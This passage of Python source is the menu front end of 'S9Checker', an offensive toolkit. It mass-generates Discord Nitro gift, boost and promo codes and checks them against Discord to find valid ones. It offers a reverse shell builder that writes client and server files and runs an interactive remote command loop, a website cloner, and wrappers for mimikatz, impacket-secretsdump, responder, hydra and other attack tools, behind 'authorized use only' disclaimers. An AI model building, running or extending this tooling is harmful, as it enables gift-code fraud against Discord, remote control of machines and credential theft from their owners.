    print(f"  {C.DK_CYN}[2]{C.RESET} Generate + Check boost codes")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt()

    if choice in ("b", ""):
        return

    if choice == "1":
        count_str = safe_input(f"{C.GRAY}How many boost codes? (default 30): {C.RESET}")
        count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 30

        type_line(f"\n  {C.GRAY}Generating {count} boost codes...{C.RESET}\n")

        codes = [generate_nitro_code(16) for _ in range(count)]
        for code in codes:
            print(f"    {C.DK_MAG}{generate_nitro_url(code)}{C.RESET}")

        print(f"\n  {C.DK_CYN}Generated {count} boost codes{C.RESET}")

        save = safe_input(f"{C.GRAY}Save to file? (y/n): {C.RESET}").lower()
        if save == "y":
            filepath = safe_input(f"{C.GRAY}Filename: {C.RESET}")
            if not filepath:
                filepath = "boost_codes.txt"
            if not filepath.endswith(".txt"):
                filepath += ".txt"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("\n".join(codes) + "\n")
            type_line(f"  {C.DK_CYN}Saved {count} codes to {filepath}{C.RESET}")

        press_enter()

    elif choice == "2":
        count_str = safe_input(f"{C.GRAY}How many codes to generate + check? (default 20): {C.RESET}")
        count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 20
        delay_str = safe_input(f"{C.GRAY}Delay between checks (default 0.5): {C.RESET}")
        delay = float(delay_str) if delay_str.replace(".", "").isdigit() else 0.5

        codes = [generate_nitro_code(16) for _ in range(count)]
        type_line(f"\n  {C.GRAY}Generated {count} boost codes. Starting check...{C.RESET}\n")

        import asyncio

        async def _run():
            checker = DiscordChecker(delay=delay)

            async def _progress(info):
                pct = info.get("percent", 0)
                valid = info.get("valid", 0)
                invalid = info.get("invalid", 0)
                speed = info.get("speed", 0)
                sys.stdout.write(
                    f"\r  {C.DK_MAG}[{pct:3d}%]{C.RESET} "
                    f"{C.DK_CYN}{valid} valid{C.RESET} | "
                    f"{C.GRAY}{invalid} invalid{C.RESET} | "
                    f"{C.DK_MAG}{speed} codes/s{C.RESET}  "
                )
                sys.stdout.flush()

            checker.progress_cb = _progress
            await checker.check_codes(codes, code_type="gift", max_concurrent=5)
            print()

            stats = checker.stats
            type_line(f"\n  {C.DK_CYN}{C.BOLD}DONE{C.RESET} - "
                      f"{C.DK_CYN}{stats['valid']} valid{C.RESET} / "
                      f"{C.GRAY}{stats['invalid']} invalid{C.RESET} / "
                      f"{C.DK_RED}{stats['errors']} errors{C.RESET}")

            # Show ALL codes with status
            if checker.results:
                type_line(f"\n  {C.DK_CYN}{C.BOLD}ALL CHECKED CODES:{C.RESET}")
                for r in checker.results:
                    url = generate_nitro_url(r.code)
                    if r.status.value == "valid":
                        print(f"    {C.DK_CYN}[VALID]{C.RESET}   {url}")
                    elif r.status.value == "rate_limited":
                        print(f"    {C.DK_YEL}[RATE]{C.RESET}    {url}")
                    elif r.status.value == "error":
                        print(f"    {C.DK_RED}[ERROR]{C.RESET}   {url}")
                    else:
                        print(f"    {C.GRAY}[INVALID]{C.RESET} {url}")

        try:
            asyncio.run(_run())
        except KeyboardInterrupt:
            type_line(f"\n  {C.DK_YEL}Check interrupted.{C.RESET}")
        press_enter()


# ── Option 9: Nitro Promo Codes ─────────────────────────────────────────────
def option_promo_generator():
    """Generate and check Nitro promo codes from partner promotions."""
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}NITRO PROMO CODES (OperaGX, etc.){C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    from modules.discord.generator import PROMO_TEMPLATES, generate_promo_code
    from modules.discord.checker import DiscordChecker

    print(f"  {C.GRAY}Available promo types:{C.RESET}\n")
    promo_names = list(PROMO_TEMPLATES.keys())
    for i, name in enumerate(promo_names, 1):
        desc = PROMO_TEMPLATES[name]["description"]
        print(f"    {C.DK_CYN}[{i:2d}]{C.RESET} {name:<15} {C.GRAY}{desc}{C.RESET}")

    print()
    print(f"  {C.DK_CYN}[G]{C.RESET} Generate + Check all types")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt()

    if choice in ("b", ""):
        return

    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(promo_names):
            promo_type = promo_names[idx]
            count_str = safe_input(f"{C.GRAY}How many {promo_type} codes? (default 30): {C.RESET}")
            count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 30
            delay_str = safe_input(f"{C.GRAY}Delay between checks (default 0.5): {C.RESET}")
            delay = float(delay_str) if delay_str.replace(".", "").isdigit() else 0.5

            codes = [generate_promo_code(promo_type) for _ in range(count)]
            type_line(f"\n  {C.GRAY}Generated {count} {promo_type} codes. Starting check...{C.RESET}\n")

            import asyncio

            async def _run():
                checker = DiscordChecker(delay=delay)

                async def _progress(info):
                    pct = info.get("percent", 0)
                    valid = info.get("valid", 0)
                    invalid = info.get("invalid", 0)
                    speed = info.get("speed", 0)
                    sys.stdout.write(
                        f"\r  {C.DK_MAG}[{pct:3d}%]{C.RESET} "
                        f"{C.DK_CYN}{valid} valid{C.RESET} | "
                        f"{C.GRAY}{invalid} invalid{C.RESET} | "
                        f"{C.DK_MAG}{speed} codes/s{C.RESET}  "
                    )
                    sys.stdout.flush()

                checker.progress_cb = _progress
                await checker.check_codes(codes, code_type="promo",
                                          promo_type=promo_type, max_concurrent=5)
                print()

                stats = checker.stats
                type_line(f"\n  {C.DK_CYN}{C.BOLD}DONE{C.RESET} - "
                          f"{C.DK_CYN}{stats['valid']} valid{C.RESET} / "
                          f"{C.GRAY}{stats['invalid']} invalid{C.RESET} / "
                          f"{C.DK_RED}{stats['errors']} errors{C.RESET}")

                # Show ALL codes with status
                if checker.results:
                    type_line(f"\n  {C.DK_CYN}{C.BOLD}ALL CHECKED CODES:{C.RESET}")
                    for r in checker.results:
                        if r.status.value == "valid":
                            print(f"    {C.DK_CYN}[VALID]{C.RESET}   {r.code}")
                        elif r.status.value == "rate_limited":
                            print(f"    {C.DK_YEL}[RATE]{C.RESET}    {r.code}")
                        elif r.status.value == "error":
                            print(f"    {C.DK_RED}[ERROR]{C.RESET}   {r.code}")
                        else:
                            print(f"    {C.GRAY}[INVALID]{C.RESET} {r.code}")

            try:
                asyncio.run(_run())
            except KeyboardInterrupt:
                type_line(f"\n  {C.DK_YEL}Check interrupted.{C.RESET}")
            press_enter()

    elif choice.lower() == "g":
        count_str = safe_input(f"{C.GRAY}How many codes per promo type? (default 20): {C.RESET}")
        count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 20
        delay_str = safe_input(f"{C.GRAY}Delay between checks (default 0.5): {C.RESET}")
        delay = float(delay_str) if delay_str.replace(".", "").isdigit() else 0.5

        import asyncio

        async def _run_all():
            for promo_type in promo_names:
                type_line(f"\n  {C.DK_MAG}--- {promo_type} ---{C.RESET}")
                codes = [generate_promo_code(promo_type) for _ in range(count)]
                checker = DiscordChecker(delay=delay)

                async def _progress(info, pt=promo_type):
                    pct = info.get("percent", 0)
                    valid = info.get("valid", 0)
                    sys.stdout.write(
                        f"\r  {C.DK_MAG}[{pt}]{C.RESET} [{pct:3d}%] "
                        f"{C.DK_CYN}{valid} valid{C.RESET}  "
                    )
                    sys.stdout.flush()

                checker.progress_cb = _progress
                await checker.check_codes(codes, code_type="promo",
                                          promo_type=promo_type, max_concurrent=5)
                stats = checker.stats
                print(f"\n    {C.DK_CYN}{stats['valid']} valid{C.RESET} / "
                      f"{C.GRAY}{stats['invalid']} invalid{C.RESET}")

                # Show ALL codes for this promo type
                if checker.results:
                    for r in checker.results:
                        if r.status.value == "valid":
                            print(f"      {C.DK_CYN}[VALID]{C.RESET}   {r.code}")
                        elif r.status.value == "error":
                            print(f"      {C.DK_RED}[ERROR]{C.RESET}   {r.code}")
                        else:
                            print(f"      {C.GRAY}[INVALID]{C.RESET} {r.code}")

        try:
            asyncio.run(_run_all())
        except KeyboardInterrupt:
            type_line(f"\n  {C.DK_YEL}Check interrupted.{C.RESET}")
        press_enter()


# ── Option 10: Website Scraper ──────────────────────────────────────────────
def option_web_scraper():
    """Scrape and clone a website's HTML, CSS, and JS files."""
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}WEBSITE SCRAPER / CLONER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    url = safe_input(f"{C.GRAY}Enter website URL: {C.RESET}").strip()
    if not url:
        return

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    output_dir = safe_input(f"{C.GRAY}Output directory (default: scraped_site): {C.RESET}")
    if not output_dir:
        output_dir = "scraped_site"

    download_assets = safe_input(f"{C.GRAY}Download CSS/JS/images? (y/n, default y): {C.RESET}").lower() != "n"

    type_line(f"\n  {C.GRAY}Scraping {url}...{C.RESET}\n")

    import asyncio
    from modules.scraper.web_scraper import WebScraper

    async def _scrape():
        scraper = WebScraper(output_dir=output_dir)
        summary = await scraper.scrape(url, download_assets=download_assets)

        if "error" in summary:
            type_line(f"  {C.DK_RED}Error: {summary['error']}{C.RESET}")
        else:
            type_line(f"\n  {C.DK_CYN}{C.BOLD}SCRAPING COMPLETE{C.RESET}")
            print(f"    HTML files:  {C.DK_CYN}{summary['html']}{C.RESET}")
            print(f"    CSS files:   {C.DK_CYN}{summary['css']}{C.RESET}")
            print(f"    JS files:    {C.DK_CYN}{summary['js']}{C.RESET}")
            print(f"    Images:      {C.DK_CYN}{summary['images']}{C.RESET}")
            print(f"\n  {C.GRAY}Saved to: {output_dir}/{C.RESET}")

    try:
        asyncio.run(_scrape())
    except KeyboardInterrupt:
        type_line(f"\n  {C.DK_YEL}Scraping interrupted.{C.RESET}")
    press_enter()


# ── Option 11: Reverse Shell Builder ────────────────────────────────────────
def option_reverse_shell():
    """Build and manage reverse shell server/client."""
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}REVERSE SHELL BUILDER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.GRAY}Security testing tool - for authorized use only.{C.RESET}")
    print()
    print(f"  {C.DK_CYN}[1]{C.RESET} Build server.exe")
    print(f"  {C.DK_CYN}[2]{C.RESET} Build client.exe")
    print(f"  {C.DK_CYN}[3]{C.RESET} Run server (interactive)")
    print(f"  {C.DK_CYN}[4]{C.RESET} Run client (connect to server)")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt()

    if choice in ("b", ""):
        return

    if choice == "1":
        # Build server
        filename = safe_input(f"{C.GRAY}Server filename (default: server.exe): {C.RESET}")
        if not filename:
            filename = "server.exe"
        if not filename.endswith(".exe"):
            filename += ".exe"

        from modules.shell.reverse_shell import build_server_exe
        code = build_server_exe()

        with open(filename, "w", encoding="utf-8") as f:
            f.write(code)

        type_line(f"  {C.DK_CYN}Created {filename}{C.RESET}")
        type_line(f"  {C.GRAY}Run with: python {filename} --port 4444{C.RESET}")
        press_enter()

    elif choice == "2":
        # Build client
        filename = safe_input(f"{C.GRAY}Client filename (default: client.exe): {C.RESET}")
        if not filename:
            filename = "client.exe"
        if not filename.endswith(".exe"):
            filename += ".exe"

        from modules.shell.reverse_shell import build_client_exe
        code = build_client_exe()

        with open(filename, "w", encoding="utf-8") as f:
            f.write(code)

        type_line(f"  {C.DK_CYN}Created {filename}{C.RESET}")
        type_line(f"  {C.GRAY}Run with: python {filename} --host <IP> --port 4444{C.RESET}")
        press_enter()

    elif choice == "3":
        # Run server
        port_str = safe_input(f"{C.GRAY}Listen port (default 4444): {C.RESET}")
        port = int(port_str) if port_str.isdigit() else 4444

        from modules.shell.reverse_shell import ReverseShellServer, ShellConfig

        config = ShellConfig(port=port)
        server = ReverseShellServer(config)

        type_line(f"\n  {C.DK_CYN}Starting server on port {port}...{C.RESET}")
        type_line(f"  {C.GRAY}Type commands to send to connected client.{C.RESET}")
        type_line(f"  {C.GRAY}Type 'exit' to stop.{C.RESET}\n")

        def run_server_thread():
            server.start()

        thread = threading.Thread(target=run_server_thread, daemon=True)
        thread.start()

        # Interactive command loop
        try:
            while True:
                cmd = safe_input(f"{C.DK_MAG}shell>{C.RESET} ")
                if cmd.lower() == "exit":
                    server.stop()
                    break
                if cmd:
                    server.send_command(cmd)
                time.sleep(0.1)
        except KeyboardInterrupt:
            server.stop()
        press_enter()

    elif choice == "4":
        # Run client
        host = safe_input(f"{C.GRAY}Server IP: {C.RESET}").strip()
        if not host:
            type_line(f"  {C.DK_RED}No IP provided.{C.RESET}")
            press_enter()
            return

        port_str = safe_input(f"{C.GRAY}Server port (default 4444): {C.RESET}")
        port = int(port_str) if port_str.isdigit() else 4444

        from modules.shell.reverse_shell import ReverseShellClient, ShellConfig

        config = ShellConfig(host=host, port=port)
        client = ReverseShellClient(config)

        type_line(f"\n  {C.DK_CYN}Connecting to {host}:{port}...{C.RESET}")

        try:
            client.start()
        except KeyboardInterrupt:
            client.stop()
        press_enter()


# ── Generic OSINT tool handler (options 12-18) ──────────────────────────────
def option_osint_tool(tool_wrapper_class, tool_name):
    """Generic handler for OSINT tools: nmap, masscan, rustscan, amass, subfinder, httpx, theHarvester."""
    tool = tool_wrapper_class()

    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}{tool_name.upper()}{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    if not tool.is_installed():
        type_line(f"  {C.DK_RED}{tool_name} is not installed.{C.RESET}")
        type_line(f"  {C.GRAY}{tool.get_help()}{C.RESET}")
        press_enter()
        return

    type_line(f"  {C.GRAY}{tool.DESCRIPTION}{C.RESET}")
    print()

    # Collect parameters based on tool type
    target = safe_input(f"{C.GRAY}Target (IP/hostname/domain): {C.RESET}").strip()
    if not target:
        type_line(f"  {C.DK_RED}No target provided.{C.RESET}")
        press_enter()
        return

    extra = safe_input(f"{C.GRAY}Extra args (optional, Enter to skip): {C.RESET}").strip()
    extra_args = extra.split() if extra else None

    type_line(f"\n  {C.GRAY}Running {tool_name} on {target}...{C.RESET}\n")

    import asyncio

    async def _run():
        kwargs = {"target": target}
        if extra_args:
            kwargs["extra_args"] = extra_args
        result = await tool.run(**kwargs)

        if result.get("success"):
            type_line(f"  {C.DK_CYN}{C.BOLD}SUCCESS{C.RESET}")
        else:
            type_line(f"  {C.DK_RED}{C.BOLD}FAILED{C.RESET}")

        output = result.get("output", "")
        error = result.get("error", "")

        if output:
            print(f"\n  {C.GRAY}--- Output ---{C.RESET}")
            for line in output.split("\n")[:100]:
                print(f"  {line}")
            if output.count("\n") > 100:
                print(f"\n  {C.GRAY}... (truncated, {output.count(chr(10))} total lines){C.RESET}")

        if error:
            type_line(f"\n  {C.DK_RED}Error: {error}{C.RESET}")

    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        type_line(f"\n  {C.DK_YEL}{tool_name} interrupted.{C.RESET}")
    press_enter()


# ── Generic exploit tool handler (options 19-28) ────────────────────────────
def option_exploit_tool(tool_wrapper_class, tool_name):
    """Generic handler for exploit/post-exploitation tools."""
    tool = tool_wrapper_class()

    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}{tool_name.upper()}{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    if not tool.is_installed():
        type_line(f"  {C.DK_RED}{tool_name} is not installed.{C.RESET}")
        type_line(f"  {C.GRAY}{tool.get_help()}{C.RESET}")
        press_enter()
        return

    type_line(f"  {C.GRAY}{tool.DESCRIPTION}{C.RESET}")
    type_line(f"  {C.GRAY}Security testing tool - for authorized use only.{C.RESET}")
    print()

    target = safe_input(f"{C.GRAY}Target: {C.RESET}").strip()
    if not target:
        type_line(f"  {C.DK_RED}No target provided.{C.RESET}")
        press_enter()
        return

    extra = safe_input(f"{C.GRAY}Extra args (optional, Enter to skip): {C.RESET}").strip()
    extra_args = extra.split() if extra else None

    type_line(f"\n  {C.GRAY}Running {tool_name}...{C.RESET}\n")

    import asyncio

    async def _run():
        kwargs = {"target": target}
        if extra_args:
            kwargs["extra_args"] = extra_args
        result = await tool.run(**kwargs)

        if result.get("success"):
            type_line(f"  {C.DK_CYN}{C.BOLD}SUCCESS{C.RESET}")
        else:
            type_line(f"  {C.DK_RED}{C.BOLD}FAILED{C.RESET}")

        output = result.get("output", "")
        error = result.get("error", "")

        if output:
            print(f"\n  {C.GRAY}--- Output ---{C.RESET}")
            for line in output.split("\n")[:100]:
                print(f"  {line}")
            if output.count("\n") > 100:
                print(f"\n  {C.GRAY}... (truncated, {output.count(chr(10))} total lines){C.RESET}")

        if error:
            type_line(f"\n  {C.DK_RED}Error: {error}{C.RESET}")

    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        type_line(f"\n  {C.DK_YEL}{tool_name} interrupted.{C.RESET}")
    press_enter()


# ── Generic reverse engineering tool handler (options 29-33) ─────────────────
def option_re_tool(tool_wrapper_class, tool_name):
    """Generic handler for reverse engineering tools."""
    tool = tool_wrapper_class()

    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}{tool_name.upper()}{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    if not tool.is_installed():
        type_line(f"  {C.DK_RED}{tool_name} is not installed.{C.RESET}")
        type_line(f"  {C.GRAY}{tool.get_help()}{C.RESET}")
        press_enter()
        return

    type_line(f"  {C.GRAY}{tool.DESCRIPTION}{C.RESET}")
    print()

    target = safe_input(f"{C.GRAY}Target file/binary: {C.RESET}").strip()
    if not target:
        type_line(f"  {C.DK_RED}No target provided.{C.RESET}")
        press_enter()
        return

    extra = safe_input(f"{C.GRAY}Extra args (optional, Enter to skip): {C.RESET}").strip()
    extra_args = extra.split() if extra else None

    type_line(f"\n  {C.GRAY}Running {tool_name}...{C.RESET}\n")

    import asyncio

    async def _run():
        kwargs = {"target": target}
        if extra_args:
            kwargs["extra_args"] = extra_args
        result = await tool.run(**kwargs)

        if result.get("success"):
            type_line(f"  {C.DK_CYN}{C.BOLD}SUCCESS{C.RESET}")
        else:
            type_line(f"  {C.DK_RED}{C.BOLD}FAILED{C.RESET}")

        output = result.get("output", "")
        error = result.get("error", "")

        if output:
            print(f"\n  {C.GRAY}--- Output ---{C.RESET}")
            for line in output.split("\n")[:100]:
                print(f"  {line}")
            if output.count("\n") > 100:
                print(f"\n  {C.GRAY}... (truncated, {output.count(chr(10))} total lines){C.RESET}")

        if error:
            type_line(f"\n  {C.DK_RED}Error: {error}{C.RESET}")

    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        type_line(f"\n  {C.DK_YEL}{tool_name} interrupted.{C.RESET}")
    press_enter()


# ── About ────────────────────────────────────────────────────────────────────
def option_about():
    """Show about page with contact info."""
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}ABOUT S9CHECKER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    type_line(f"  {C.GRAY}S9Checker v2.0 — Multi-Platform Security Tool{C.RESET}", delay=0.01)
    print()
    print(f"  {C.DK_CYN}Discord:{C.RESET}  {C.DK_MAG}s9._.{C.RESET}")
    print(f"  {C.DK_CYN}GitHub:{C.RESET}   {C.DK_MAG}s9DeVs9{C.RESET}")
    print()
    print(f"  {C.GRAY}Built for authorized security testing only.{C.RESET}")
    print(f"  {C.GRAY}Unauthorized access to computer systems is illegal.{C.RESET}")
    press_enter()


# ── Main CLI loop ────────────────────────────────────────────────────────────
def run_cli():
    global _first_run
    current_page = 1

    try:
        while True:
            if _first_run:
                animated_startup()
            else:
                clear_screen()
                print_banner()
                print_menu(current_page)

            choice = prompt()

            # ── Page navigation ──────────────────────────────────────────
            if choice.lower() == "n" and current_page < 4:
                current_page += 1
                continue
            elif choice.lower() == "b" and current_page > 1:
                current_page -= 1
                continue

            # ── Page 1 tools ─────────────────────────────────────────────
            if current_page == 1:
                if choice == "1":
                    option_launch_gui()
                elif choice == "2":
                    option_manage_combolists()
                elif choice == "3":
                    option_quick_check()
                elif choice == "4":
                    option_view_results()
                elif choice == "5":
                    option_settings()
                elif choice == "6":
                    option_proxy_generator()
                elif choice == "7":
                    option_nitro_generator()
                elif choice == "8":
                    option_boost_generator()
                elif choice == "9":
                    option_promo_generator()
                elif choice == "10":
                    option_web_scraper()
                elif choice == "0":
                    type_line(f"\n  {C.DK_MAG}Goodbye!{C.RESET}", delay=0.04)
                    break
                else:
                    type_line(f"  {C.DK_RED}Invalid option. Try again.{C.RESET}")
                    time.sleep(0.8)

            # ── Page 2 tools ─────────────────────────────────────────────
            elif current_page == 2:
                if choice == "11":
                    option_reverse_shell()
                elif choice == "12":
                    from modules.osint.nmap import ToolWrapper
                    option_osint_tool(ToolWrapper, "nmap")
                elif choice == "13":
                    from modules.osint.masscan import ToolWrapper
                    option_osint_tool(ToolWrapper, "masscan")
                elif choice == "14":
                    from modules.osint.rustscan import ToolWrapper
                    option_osint_tool(ToolWrapper, "rustscan")
                elif choice == "15":
                    from modules.osint.amass import ToolWrapper
                    option_osint_tool(ToolWrapper, "amass")
                elif choice == "16":
                    from modules.osint.subfinder import ToolWrapper
                    option_osint_tool(ToolWrapper, "subfinder")
                elif choice == "17":
                    from modules.osint.httpx import ToolWrapper
                    option_osint_tool(ToolWrapper, "httpx")
                elif choice == "18":
                    from modules.osint.theharvester import ToolWrapper
                    option_osint_tool(ToolWrapper, "theHarvester")
                elif choice == "19":
                    from modules.exploit.searchsploit import ToolWrapper
                    option_exploit_tool(ToolWrapper, "searchsploit")
                elif choice == "20":
                    from modules.exploit.metasploit import ToolWrapper
                    option_exploit_tool(ToolWrapper, "metasploit")
                elif choice == "0":
                    type_line(f"\n  {C.DK_MAG}Goodbye!{C.RESET}", delay=0.04)
                    break
                else:
                    type_line(f"  {C.DK_RED}Invalid option. Try again.{C.RESET}")
                    time.sleep(0.8)

            # ── Page 3 tools ─────────────────────────────────────────────
            elif current_page == 3:
                if choice == "21":
                    from modules.exploit.impacket import SecretsDumpWrapper
                    option_exploit_tool(SecretsDumpWrapper, "impacket-secretsdump")
                elif choice == "22":
                    from modules.exploit.responder import ToolWrapper
                    option_exploit_tool(ToolWrapper, "responder")
                elif choice == "23":
                    from modules.exploit.crackmapexec import ToolWrapper
                    option_exploit_tool(ToolWrapper, "crackmapexec")
                elif choice == "24":
                    from modules.exploit.bloodhound import ToolWrapper
                    option_exploit_tool(ToolWrapper, "bloodhound")
                elif choice == "25":
                    from modules.exploit.mimikatz import ToolWrapper
                    option_exploit_tool(ToolWrapper, "mimikatz")
                elif choice == "26":
                    from modules.exploit.hashcat import ToolWrapper
                    option_exploit_tool(ToolWrapper, "hashcat")
                elif choice == "27":
                    from modules.exploit.john import ToolWrapper
                    option_exploit_tool(ToolWrapper, "john")
                elif choice == "28":
                    from modules.exploit.hydra import ToolWrapper
                    option_exploit_tool(ToolWrapper, "hydra")
                elif choice == "29":
                    from modules.reverse_engineering.ghidra import ToolWrapper
                    option_re_tool(ToolWrapper, "ghidra")
                elif choice == "30":
                    from modules.reverse_engineering.radare2 import ToolWrapper
                    option_re_tool(ToolWrapper, "radare2")
                elif choice == "0":
                    type_line(f"\n  {C.DK_MAG}Goodbye!{C.RESET}", delay=0.04)
                    break
                else:
                    type_line(f"  {C.DK_RED}Invalid option. Try again.{C.RESET}")
                    time.sleep(0.8)

            # ── Page 4 tools ─────────────────────────────────────────────
            elif current_page == 4:
                if choice == "31":
                    from modules.reverse_engineering.pwndbg import ToolWrapper
                    option_re_tool(ToolWrapper, "gdb+pwndbg")
                elif choice == "32":
                    from modules.reverse_engineering.binwalk import ToolWrapper
                    option_re_tool(ToolWrapper, "binwalk")
                elif choice == "33":
                    from modules.reverse_engineering.pwntools import ToolWrapper
                    option_re_tool(ToolWrapper, "pwntools")
                elif choice.lower() == "a":
                    option_about()
                elif choice == "0":
                    type_line(f"\n  {C.DK_MAG}Goodbye!{C.RESET}", delay=0.04)
                    break
                else:
                    type_line(f"  {C.DK_RED}Invalid option. Try again.{C.RESET}")
                    time.sleep(0.8)

    except KeyboardInterrupt:
        print()
        type_line(f"  {C.DK_YEL}S9Checker terminated.{C.RESET}", delay=0.03)
        sys.exit(0)
